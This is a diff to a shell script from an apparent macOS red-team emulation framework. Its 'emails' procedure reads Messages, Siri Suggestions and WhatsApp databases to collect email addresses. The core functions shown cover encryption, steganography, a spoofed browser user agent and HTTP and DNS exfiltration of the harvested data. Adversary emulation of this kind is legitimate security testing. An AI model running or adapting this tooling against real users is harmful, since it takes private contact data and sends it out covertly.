@@ -1,24 +1,26 @@
 #!/bin/sh
-# POSIX-compliant shell script - avoid bashisms
-# Script Name: base.sh
-# MITRE ATT&CK Technique: [TECHNIQUE_ID]
-# Author: @darmado | https://x.com/darmad0
-# Date: $(date '+%Y-%m-%d')
-# Version: 1.0
+# POSIX-compliant
+# Procedure Name: emails
+# Tactic: Discovery
+# Technique: T1087.003
+# GUID: 1650abc4-b8f5-489a-8c3e-f5e3cf6499cb
+# Intent: Discover email addresses from verified macOS databases containing confirmed email data
+# Author: @darmado
+# created: 2025-01-27
+# Updated: 2025-05-30
+# Version: 1.0.0
+# License: Apache 2.0
 
-# Description:
+# Core function Info:
 # This is a standalone base script template that can be used to build any technique.
-# Replace this description with the actual technique description.
-# The script uses native macOS commands and APIs for maximum compatibility.
 
 #------------------------------------------------------------------------------
 # Configuration Section
 #------------------------------------------------------------------------------
-
+NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
-SUBTECHNIQUE_ID=""
+TTP_ID="T1087.003" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -36,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="base"
+
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -90,13 +92,29 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
+MESSAGES=false
+ENTITIES=false
+WHATSAPP=false
+ALL=false
+
+INPUT_DOMAIN=""
+DB_MESSAGES="$HOME/Library/Messages/chat.db"
+DB_ENTITIES="$HOME/Library/Suggestions/entities.db"
+DB_WHATSAPP_CHAT="$HOME/Library/Group Containers/group.net.whatsapp.WhatsApp.shared/ChatStorage.sqlite"
+
+# Procedure Information (set by build system)
+PROCEDURE_NAME="emails"  # Set by build system from YAML procedure_name field
+
+# Function execution tracking
+FUNCTION_LANG=""  # Ued by log_output at execution time
+
 # Logging Settings
 HOME_DIR="${HOME}"
 LOG_DIR="./logs"  # Simple path to logs in current directory
-LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
+LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
 LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
 LOG_ENABLED=false
-SYSLOG_TAG="${NAME}"
+SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
 
 # Default settings
 DEBUG=false
@@ -111,29 +129,6 @@ CHECK_PERMS="false"
 CHECK_FDA="false"
 CHECK_DB_LOCK="false"
 
-MESSAGES=false
-ENTITIES=false
-WHATSAPP=false
-ALL=false
-
-INPUT_DOMAIN=""
-DB_MESSAGES="$HOME/Library/Messages/chat.db"
-DB_ENTITIES="$HOME/Library/Suggestions/entities.db"
-DB_WHATSAPP_CHAT="$HOME/Library/Group Containers/group.net.whatsapp.WhatsApp.shared/ChatStorage.sqlite"
-
-# MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with your corresponding tactic
-TTP_ID="T1082" #replace with your corresponding ttp_id
-SUBTECHNIQUE_ID=""
-
-TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
-TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCODE="T1140" # DO NOT MODIFY
-TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
-TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
 
 # Output Configuration
 FORMAT=""          # json, csv, or empty for raw
@@ -169,7 +164,7 @@ DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
 # Purpose: Get the current timestamp in a consistent format
 # Inputs: None
 # Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
-# Side Effects: None
+# - None
 core_get_timestamp() {
     # Use direct command to avoid variable expansion issues
     date "+%Y-%m-%d %H:%M:%S"
@@ -178,7 +173,7 @@ core_get_timestamp() {
 # Purpose: Generate a unique job ID for tracking script execution
 # Inputs: None
 # Outputs: 8-character hexadecimal job ID
-# Side Effects: None
+# - None
 core_generate_job_id() {
     # Use openssl to generate random hex string for job tracking
     # Fallback to date-based ID if openssl not available
@@ -196,7 +191,7 @@ core_generate_job_id() {
 # Purpose: Print debug messages to stderr when debug mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stderr)
-# Side Effects: Writes to stderr if DEBUG=true
+# - Writes to stderr if DEBUG=true
 core_debug_print() {
     if [ "$DEBUG" = true ]; then
         local timestamp=$(core_get_timestamp)
@@ -207,12 +202,12 @@ core_debug_print() {
 # Purpose: Print verbose messages to stdout when verbose mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stdout)
-# Side Effects: Writes to stdout if VERBOSE=true
+# - Writes to stdout if VERBOSE=true
 
 # Purpose: Handle errors consistently with proper formatting and logging
 # Inputs: $1 - Error message
 # Outputs: None (prints directly to stderr)
-# Side Effects: 
+# - 
 #   - Writes to stderr
 #   - Logs error message if LOG_ENABLED=true
 #   - Returns error code 1
@@ -234,7 +229,7 @@ core_handle_error() {
 #   $2 - Status type (info, error, etc.), defaults to "info"
 #   $3 - Skip data flag (true/false), defaults to false
 # Outputs: None
-# Side Effects:
+# 
 #   - Creates log directory if it doesn't exist
 #   - Writes to log file if LOG_ENABLED=true
 #   - Rotates log file if size exceeds LOG_MAX_SIZE
@@ -247,7 +242,7 @@ core_log_output() {
     
     if [ "$LOG_ENABLED" = true ]; then
         # Ensure log directory exists
-        if [ ! -d "$LOG_DIR" ]; then
+            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
@@ -261,7 +256,7 @@ core_log_output() {
         fi
         
         # Log detailed entry
-        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
+        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
             "$(core_get_timestamp)" \
             "$status" \
             "$$" \
@@ -273,7 +268,9 @@ core_log_output() {
             "${FORMAT:-raw}" \
             "$ENCODING_TYPE" \
             "${ENCRYPTION_TYPE:-none}" \
-            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
+            "${EXFIL_TYPE:-none}" \
+            "${FUNCTION_LANG:-shell}" \
+            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
             
         if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
             "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
@@ -285,7 +282,7 @@ core_log_output() {
         fi
 
         # Also log to syslog
-        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
+        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
     fi
     
     # Output to stdout if in debug mode only
@@ -299,7 +296,7 @@ core_log_output() {
 #  $1 - Input string to validate
 #  $2 - Validation type (string|integer|domain|url|file_path)
 #Outputs: 0 if valid, 1 if invalid
-#Side Effects: Prints error message to stderr on validation failure
+#- Prints error message to stderr on validation failure
 core_validate_input() {
     local input="$1"
     local validation_type="$2"
@@ -374,7 +371,7 @@ core_validate_input() {
 # Purpose: Extract domain from URL for validation
 # Inputs: $1 - URL string
 # Outputs: Domain part of URL
-# Side Effects: None
+# - None
 core_extract_domain_from_url() {
     local url="$1"
     "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -383,7 +380,7 @@ core_extract_domain_from_url() {
 # Purpose: Validate that essential commands are available before script execution
 # Inputs: None
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Returns 1 if any essential command is missing
 #   - Calls core_handle_error on missing commands
 core_validate_command() {
@@ -407,7 +404,7 @@ core_validate_command() {
 # Purpose: Check if a domain resolves to a valid IP address
 # Inputs: $1 - Domain to check
 # Outputs: 0 if domain resolves, 1 if not
-# Side Effects: Prints error message if domain doesn't resolve
+# - Prints error message if domain doesn't resolve
 core_validate_domain() {
     local domain="$1"
     
@@ -444,7 +441,7 @@ core_validate_domain() {
 # Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
 # Inputs: $@ - All command-line arguments passed to the script
 # Outputs: None
-# Side Effects: Sets global flag variables based on command-line options
+# - Sets global flag variables based on command-line options
 core_parse_args() {
     # Track unknown arguments and missing values for error reporting
     UNKNOWN_ARGS=""
@@ -673,7 +670,7 @@ EOF
 #   $1 - Raw output data to process
 #   $2 - Data source identifier (defaults to "generic")
 # Outputs: Processed output (formatted/encoded/encrypted as requested)
-# Side Effects:
+# Logic:
 #   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
 core_process_output() {
     local output="$1"
@@ -687,10 +684,10 @@ core_process_output() {
     if [ -n "$FORMAT" ]; then
         if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
             # For JSON, only use raw data here - we'll add transformation metadata at the end
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
         else
             # For other formats, just format the raw output
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
         fi
         core_debug_print "Output formatted as $FORMAT"
     fi
@@ -737,7 +734,7 @@ core_process_output() {
 #   $3 - Data source identifier (defaults to "generic")
 #   $4-7 - Additional parameters for JSON metadata
 # Outputs: Formatted data
-# Side Effects: None
+# - None
 core_format_output() {
     local output="$1"
     local format="$2"
@@ -753,7 +750,7 @@ core_format_output() {
     
     case "$format" in
         json|json-lines)
-            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
+            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
             ;;
         csv)
             formatted=$(core_format_as_csv "$output")
@@ -776,7 +773,7 @@ core_format_output() {
 #   $6 - Encryption method
 #   $7 - Whether steganography is used (true/false)
 # Outputs: JSON-formatted string with data and metadata
-# Side Effects: None
+# - None
 core_format_as_json() {
     local output="$1"
     local data_source="${2:-generic}"
@@ -797,7 +794,7 @@ core_format_as_json() {
     json_output="$json_output
   \"jobId\": \"$JOB_ID\","
     json_output="$json_output
-  \"dataSource\": \"$data_source\","
+  \"procedure\": \"$PROCEDURE_NAME\","
     
     # Always include encoding and encryption status
         json_output="$json_output
@@ -900,7 +897,7 @@ core_format_as_csv() {
 #   $1 - Output data to encode
 #   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
 # Outputs: Encoded data according to specified method
-# Side Effects: None
+# - None
 core_encode_output() {
     local output="$1"
     local encode_type="$2"
@@ -942,7 +939,7 @@ core_encode_output() {
 #   $2 - Encryption method (none|aes|gpg|xor)
 #   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
 # Outputs: Encrypted data or original data if no encryption
-# Side Effects: None (delegated to specific encryption functions)
+# - None (delegated to specific encryption functions)
 core_encrypt_output() {
     local data="$1"
     local method="$2"
@@ -990,7 +987,7 @@ core_encrypt_output() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: AES-256-CBC encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "aes" on success
 #   - Writes error message to stderr on failure
 encrypt_with_aes() {
@@ -1017,7 +1014,7 @@ encrypt_with_aes() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: GPG symmetrically encrypted data in ASCII armor format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "gpg" on success
 #   - Writes error message to stderr on failure/if GPG not found
 encrypt_with_gpg() {
@@ -1044,7 +1041,7 @@ encrypt_with_gpg() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: XOR encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "xor" on success
 #   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
 encrypt_with_xor() {
@@ -1084,7 +1081,7 @@ encrypt_with_xor() {
 # Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
 # Inputs: $1 - Data to encode
 # Outputs: Base64 URL-safe encoded data
-# Side Effects: None
+# - None
 core_url_safe_encode() {
     local data="$1"
     local encoded
@@ -1101,7 +1098,7 @@ core_url_safe_encode() {
 # Purpose: DNS-safe encode data for DNS exfiltration
 # Inputs: $1 - Data to encode  
 # Outputs: Base64 DNS-safe encoded data
-# Side Effects: None
+# - None
 core_dns_safe_encode() {
     local data="$1"
     local encoded
@@ -1118,7 +1115,7 @@ core_dns_safe_encode() {
 # Purpose: Generate user agent string for HTTP requests
 # Inputs: None
 # Outputs: User agent string
-# Side Effects: None
+# - None
 core_get_user_agent() {
     $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 }
@@ -1126,7 +1123,7 @@ core_get_user_agent() {
 # Purpose: Prepare proxy argument for curl if needed
 # Inputs: None - uses global PROXY_URL variable
 # Outputs: Proxy argument for curl or empty string
-# Side Effects: May modify global PROXY_URL to add protocol prefix
+# - May modify global PROXY_URL to add protocol prefix
 core_prepare_proxy_arg() {
     local proxy_arg=""
     
@@ -1143,7 +1140,7 @@ core_prepare_proxy_arg() {
 # Purpose: Normalize URI by ensuring it has http:// prefix
 # Inputs: $1 - URI to normalize
 # Outputs: Normalized URI with protocol prefix
-# Side Effects: None
+# - None
 core_normalize_uri() {
     local uri="$1"
     
@@ -1156,7 +1153,7 @@ core_normalize_uri() {
 # Purpose: Extract domain from a full URI
 # Inputs: $1 - Full URI
 # Outputs: Domain part of the URI
-# Side Effects: None
+# - None
 core_extract_domain() {
     local uri="$1"
     "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -1166,7 +1163,7 @@ core_extract_domain() {
 # Inputs: 
 #   $1 - Raw data
 # Outputs: Data with optional start/end markers
-# Side Effects: None (uses global EXFIL_START/EXFIL_END)
+# - None (uses global EXFIL_START/EXFIL_END)
 core_prepare_exfil_data() {
     local data="$1"
     
@@ -1184,7 +1181,7 @@ core_prepare_exfil_data() {
 # Inputs:
 #   $1 - Domain to send key to
 # Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
-# Side Effects: Makes DNS request
+# - Makes DNS request
 core_send_key_via_dns() {
     local domain="$1"
     local encrypted_key=""
@@ -1227,7 +1224,7 @@ core_send_key_via_dns() {
 #   $1 - Encoded data
 #   $2 - Optional encrypted key (empty if key sent via DNS)
 # Outputs: JSON payload string
-# Side Effects: None
+# - None
 core_generate_json_payload() {
     local encoded_data="$1"
     local encrypted_key="$2"
@@ -1271,7 +1268,7 @@ EOF
 # Purpose: Determine appropriate content type for HTTP exfiltration
 # Inputs: None (uses global ENCODE variable)
 # Outputs: Content type string
-# Side Effects: None
+# - None
 core_get_content_type() {
     local content_type="text/plain"
     if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
@@ -1286,7 +1283,7 @@ core_get_content_type() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes HTTP request
+# - Makes HTTP request
 core_exfil_http_post() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1332,7 +1329,7 @@ core_exfil_http_post() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple HTTP requests
+# - Makes multiple HTTP requests
 core_exfil_http_get() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1406,7 +1403,7 @@ core_exfil_http_get() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple DNS requests
+# - Makes multiple DNS requests
 core_exfil_dns() {
     local data="$1"
     
@@ -1482,7 +1479,7 @@ core_exfil_dns() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Logs exfiltration attempt if LOG_ENABLED=true
 #   - Performs network requests to exfiltrate data
 #   - May modify data for transport (encoding, chunking)
@@ -1536,7 +1533,7 @@ core_exfiltrate_data() {
 # Inputs:
 #   $1 - Processed data (after formatting/encoding/encryption)
 # Outputs: None (writes to various destinations)
-# Side Effects:
+# Logic:
 #   - Logs output if LOG_ENABLED=true
 #   - Exfiltrates data if EXFIL=true
 #   - Always prints data to stdout
@@ -1568,7 +1565,7 @@ core_transform_output() {
 # Purpose: Extract hidden data from a steganography image
 # Inputs: $1 - Image file with hidden data
 # Outputs: Extracted and decoded data
-# Side Effects: None
+# - None
 core_extract_steganography() {
     local steg_file="$1"
     
@@ -1604,7 +1601,7 @@ core_extract_steganography() {
 # Purpose: Perform steganography by hiding data in an image
 # Inputs: None (uses global variables)
 # Outputs: Status message
-# Side Effects: Creates output image file
+# - Creates output image file
 core_steganography() {
     # Define local variables
     local message=""
@@ -1677,7 +1674,7 @@ core_steganography() {
 # Purpose: Apply steganography to data in the processing pipeline
 # Inputs: $1 - Data to hide in steganography
 # Outputs: Status message (actual data is written to file)
-# Side Effects: Creates output image file
+# - Creates output image file
 core_apply_steganography() {
     local data_to_hide="$1"
     local carrier_image=""
@@ -1720,7 +1717,7 @@ core_apply_steganography() {
 #   $3 - Write permission required (true/false)
 #   $4 - Execute permission required (true/false)
 # Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
-# Side Effects: Logs debug information
+# - Logs debug information
 core_check_perms() {
     local file="$1"
     local read_required="$2"
@@ -1749,7 +1746,7 @@ core_check_perms() {
     return 0
 }
 
-# Side Effects: None
+# - None
 # Note: Simple implementation for YAML check_fda
 core_check_fda() {
     [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
@@ -1758,7 +1755,7 @@ core_check_fda() {
 # Purpose: Check if database is locked by another process
 # Inputs: $1 - Database path
 # Outputs: 0 if database is not locked, 1 if locked
-# Side Effects: None
+# - None
 # Note: Comprehensive implementation checking lock files, processes, and database state
 core_check_db_lock() {
     local db_path="$1"
@@ -1850,6 +1847,9 @@ core_main() {
 # Execute main logic
 raw_output=""
 
+# Set global function language for this procedure
+FUNCTION_LANG="shell"
+
 # Execute functions for --messages
 if [ "$MESSAGES" = true ]; then
     core_debug_print "Executing functions for --messages"
@@ -1882,7 +1882,8 @@ if [ "$ALL" = true ]; then
     raw_output="${raw_output}${result}\n"
 fi
 
-data_source="emails"
+# Set procedure name for processing
+procedure="emails"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -1891,7 +1892,7 @@ data_source="emails"
         fi  
     fi
     # Process the output (format, encode, encrypt)
-    processed_output=$(core_process_output "$raw_output" "$data_source")
+    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
     
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
@@ -1901,7 +1902,7 @@ data_source="emails"
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
 # Outputs: 0 if valid, 1 if invalid
-# Side Effects: Prints error messages for invalid arguments but continues execution
+# - Prints error messages for invalid arguments but continues execution
 core_validate_parsed_args() {
     local validation_errors=""
     local has_valid_actions=false
@@ -2033,7 +2034,7 @@ core_validate_parsed_args() {
 # Purpose: Generate encryption key if encryption is enabled
 # Inputs: None (uses global ENCRYPT variable)
 # Outputs: None
-# Side Effects: Sets global ENCRYPT_KEY variable
+# - Sets global ENCRYPT_KEY variable
 core_generate_encryption_key() {
     if [ "$ENCRYPT" != "none" ]; then
         ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
@@ -2174,6 +2175,23 @@ discover_whatsapp_emails() {
 
 
 JOB_ID=$(core_generate_job_id)
+
+# Purpose: Get log filename dynamically based on PROCEDURE_NAME
+# Inputs: None
+# Outputs: Log filename string
+# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
+core_get_log_filename() {
+    if [ -z "$LOG_FILE_NAME" ]; then
+        if [ -n "$PROCEDURE_NAME" ]; then
+            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+        else
+            LOG_FILE_NAME="${TTP_ID}.log"
+            SYSLOG_TAG="${TTP_ID}"
+        fi
+    fi
+    echo "$LOG_FILE_NAME"
+}
 
 # Execute main function with all arguments
 core_main "$@" 
